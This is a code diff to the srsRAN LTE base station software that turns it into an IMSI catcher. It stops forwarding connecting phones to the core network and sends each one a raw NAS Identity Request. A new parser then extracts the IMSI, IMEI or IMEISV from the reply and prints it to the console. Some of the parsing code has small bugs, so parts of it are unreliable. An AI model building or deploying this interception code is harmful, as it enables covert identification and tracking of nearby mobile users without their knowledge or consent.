@@ -32,6 +32,8 @@
 #include "srsran/interfaces/enb_rlc_interfaces.h"
 #include "srsran/interfaces/enb_s1ap_interfaces.h"
 #include "srsran/support/srsran_assert.h"
+#include <iomanip>
+#include <sstream>
 
 using namespace asn1::rrc;
 
@@ -379,7 +381,8 @@ void rrc::ue::parse_ul_dcch(uint32_t lcid, srsran::unique_byte_buffer_t pdu)
                  .ded_info_type.ded_info_nas()
                  .data(),
              pdu->N_bytes);
-      parent->s1ap->write_pdu(rnti, std::move(pdu));
+      extract_imsi(rnti, pdu->msg, pdu->N_bytes);
+      // parent->s1ap->write_pdu(rnti, std::move(pdu));
       break;
     case ul_dcch_msg_type_c::c1_c_::types::rrc_conn_recfg_complete:
       save_ul_message(std::move(original_pdu));
@@ -430,6 +433,102 @@ void rrc::ue::parse_ul_dcch(uint32_t lcid, srsran::unique_byte_buffer_t pdu)
     default:
       parent->logger.error("Msg: %s not supported", ul_dcch_msg.msg.c1().type().to_string());
       break;
+  }
+}
+
+void rrc::ue::extract_imsi(uint16_t rnti, uint8_t* msg, uint32_t msg_len)
+{
+  uint8_t* ptr = msg;
+  if ((*ptr & 0b111) != 0b111) {
+    /* Not EPS mobility management message 0x7 */
+    return;
+  }
+  if (*ptr & 0b10000) {
+    /* Integrity protected */
+    ptr += 6;
+    if (ptr - msg > msg_len) {
+      return;
+    }
+    return extract_imsi(rnti, ptr, msg_len - (ptr - msg));
+  }
+  if (ptr[1] != 0x56) {
+    /* Not identity response */
+    return;
+  }
+  /* Now we follow liblte_mme_unpack_mobile_id_ie to process the identity ptr */
+  uint8_t* ie_ptr = ptr + 2;
+  uint32_t length = ie_ptr[0];
+  ie_ptr++;
+  std::string identity_type = "";
+  uint32_t    i;
+  uint8_t*    id;
+  uint8_t     imsi[15];
+  uint8_t     imei[15];
+  uint8_t     imeisv[16];
+  bool        odd = false;
+
+  uint8_t type_of_id = *ie_ptr & 0b111;
+  switch (type_of_id) {
+    case 0x1: // IMSI
+    {
+      identity_type = "IMSI";
+      id            = imsi;
+      odd           = true;
+      break;
+    }
+    case 0x2: // IMEI
+    {
+      identity_type = "IMEI";
+      id            = imei;
+      odd           = true;
+      break;
+    }
+    case 0x3: // IMEISV
+    {
+      identity_type = "IMEISV";
+      id            = imeisv;
+      odd           = false;
+      break;
+    }
+    case 0x4: // TMSI
+      identity_type = "TMSI";
+      odd           = false;
+      break;
+    default:
+      srsran::console("Unknown identity type: %d\n", type_of_id);
+      return;
+  }
+  if (type_of_id != 0x4) {
+    id[0] = *ie_ptr >> 4;
+    ie_ptr++;
+    for (i = 0; i < 7; i++) {
+      id[i * 2 + 1] = ie_ptr[i] & 0x0f;
+      id[i * 2 + 2] = ie_ptr[i] >> 4;
+    }
+    if (odd) {
+      ie_ptr += 7;
+    } else {
+      id[i * 2 + 1] = ie_ptr[i] * 0xf;
+      ie_ptr += 8;
+    }
+    std::ostringstream oss;
+    uint32_t           identity_buffer_size = 0;
+    if (type_of_id == 0x3) { // 16
+      identity_buffer_size = 16;
+    } else { // 15
+      identity_buffer_size = 15;
+    }
+    for (uint32_t j = 0; j < identity_buffer_size; j++) {
+      oss << static_cast<int>(id[j]);
+    }
+    srsran::console("\033[33mIMSI Catcher catched identity %s: %s\033[0m\n", identity_type.c_str(), oss.str().c_str());
+  } else {
+    ie_ptr += 1;
+    uint32_t tmsi = 0;
+    for (i = 0; i < 4; i++) {
+      tmsi += (ie_ptr[i] & 0xff) << ((3 - i) * 8);
+    }
+    srsran::console("UE IMSI: %u\n", tmsi);
   }
 }
 
@@ -567,21 +666,39 @@ void rrc::ue::handle_rrc_con_setup_complete(rrc_conn_setup_complete_s* msg, srsr
   s1ap_cause.value = (asn1::s1ap::rrc_establishment_cause_opts::options)establishment_cause.value;
 
   uint32_t enb_cc_idx = ue_cell_list.get_ue_cc_idx(UE_PCELL_CC_IDX)->cell_common->enb_cc_idx;
-  if (has_tmsi) {
-    parent->s1ap->initial_ue(rnti, enb_cc_idx, s1ap_cause, std::move(pdu), m_tmsi, mmec);
-  } else {
-    parent->s1ap->initial_ue(rnti, enb_cc_idx, s1ap_cause, std::move(pdu));
-  }
+  send_identity_request();
+  // if (has_tmsi) {
+  //   parent->s1ap->initial_ue(rnti, enb_cc_idx, s1ap_cause, std::move(pdu), m_tmsi, mmec);
+  // } else {
+  // parent->s1ap->initial_ue(rnti, enb_cc_idx, s1ap_cause, std::move(pdu));
+  // }
 
-  // 2> if the UE has radio link failure or handover failure information available
-  if (msg->crit_exts.type().value == c1_or_crit_ext_opts::c1 and
-      msg->crit_exts.c1().type().value ==
-          rrc_conn_setup_complete_s::crit_exts_c_::c1_c_::types_opts::rrc_conn_setup_complete_r8) {
-    const auto& complete_r8 = msg->crit_exts.c1().rrc_conn_setup_complete_r8();
-    if (complete_r8.non_crit_ext.non_crit_ext.rlf_info_available_r10_present) {
-      rlf_info_pending = true;
-    }
-  }
+  // // 2> if the UE has radio link failure or handover failure information available
+  // if (msg->crit_exts.type().value == c1_or_crit_ext_opts::c1 and
+  //     msg->crit_exts.c1().type().value ==
+  //         rrc_conn_setup_complete_s::crit_exts_c_::c1_c_::types_opts::rrc_conn_setup_complete_r8) {
+  //   const auto& complete_r8 = msg->crit_exts.c1().rrc_conn_setup_complete_r8();
+  //   if (complete_r8.non_crit_ext.non_crit_ext.rlf_info_available_r10_present) {
+  //     rlf_info_pending = true;
+  //   }
+  // }
+}
+
+void rrc::ue::send_identity_request()
+{
+  dl_dcch_msg_s dl_dcch_msg;
+  dl_dcch_msg.msg.set_c1();
+  dl_dcch_msg_type_c::c1_c_* msg_c1     = &dl_dcch_msg.msg.c1();
+  dl_info_transfer_r8_ies_s* dl_info_r8 = &msg_c1->set_dl_info_transfer().crit_exts.set_c1().set_dl_info_transfer_r8();
+  //    msg_c1->dl_info_transfer().rrc_transaction_id = ;
+  dl_info_r8->non_crit_ext_present = false;
+  dl_info_r8->ded_info_type.set_ded_info_nas();
+  dl_info_r8->ded_info_type.ded_info_nas().resize(4);
+  uint8_t identity_request_raw[3] = {0x07, 0x55, 0x01};
+  memcpy(msg_c1->dl_info_transfer().crit_exts.c1().dl_info_transfer_r8().ded_info_type.ded_info_nas().data(),
+         identity_request_raw,
+         3);
+  send_dl_dcch(&dl_dcch_msg);
 }
 
 void rrc::ue::send_connection_reject(procedure_result_code cause)
